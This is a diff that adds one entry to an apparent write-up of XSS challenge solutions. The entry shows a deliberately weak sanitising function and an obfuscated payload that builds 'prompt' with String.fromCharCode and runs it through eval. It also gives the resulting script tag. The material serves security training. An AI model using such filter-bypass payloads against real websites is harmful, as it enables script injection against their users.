@@ -107,6 +107,34 @@ Solution
 <p class="comment" title="*/</script>"></p>
 ```
 
+### A. Escape encodeURIComponent
+
+- Task
+
+```
+function escape(input) {
+    // (╯°□°）╯︵ ┻━┻
+    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
+    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
+    input = input.replace(/'/g, '');
+
+    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
+    return '<script>' + input + '</script> ';
+}   
+```
+
+- Solution
+
+```
+eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.fromCharCode(111).concat(String.fromCharCode(109).concat(String.fromCharCode(112).concat(String.fromCharCode(116)))))))(1)
+```
+
+- HTML source
+
+```
+<script>eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.fromCharCode(111).concat(String.fromCharCode(109).concat(String.fromCharCode(112).concat(String.fromCharCode(116)))))))(1)</script>
+```
+
 # alf.nu/alert1
 
 ### 1. Warmup
